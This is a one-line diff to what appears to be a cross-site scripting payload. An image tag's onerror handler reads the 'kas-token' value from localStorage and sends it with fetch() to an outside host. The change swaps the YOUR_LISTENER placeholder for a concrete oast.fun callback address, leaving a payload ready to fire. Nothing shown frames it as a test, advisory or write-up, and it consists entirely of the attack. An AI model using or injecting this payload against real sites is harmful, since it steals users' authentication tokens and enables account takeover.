@@ -1,1 +1,1 @@
-<img src=x onerror="fetch('https://YOUR_LISTENER/?t='+encodeURIComponent(localStorage.getItem('kas-token')))">
+<img src=x onerror="fetch('https://ffyivfsprwfudrczasfmx3gmldyg25xkj.oast.fun/?t='+encodeURIComponent(localStorage.getItem('kas-token')))">
